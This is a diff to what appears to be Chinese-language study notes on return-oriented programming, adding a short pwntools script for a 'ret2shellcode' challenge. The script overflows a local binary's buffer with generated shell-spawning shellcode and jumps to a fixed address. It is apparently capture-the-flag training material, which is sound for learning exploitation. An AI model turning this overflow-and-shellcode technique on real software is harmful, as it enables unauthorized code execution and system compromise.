@@ -65,6 +65,21 @@ r.interactive()
 
 ### # ret2shellcode
 
+```python
+from pwn import *
+
+
+r = process('./ret2shellcode')
+
+r.recvuntil('!!!\n')
+shell = asm(shellcraft.sh())
+p = shell.ljust(0x6c+0x4, 'a') + p32(0x0804A080)
+
+r.sendline(p)
+
+r.interactive()
+```
+
 
 
 ## 中级ROP
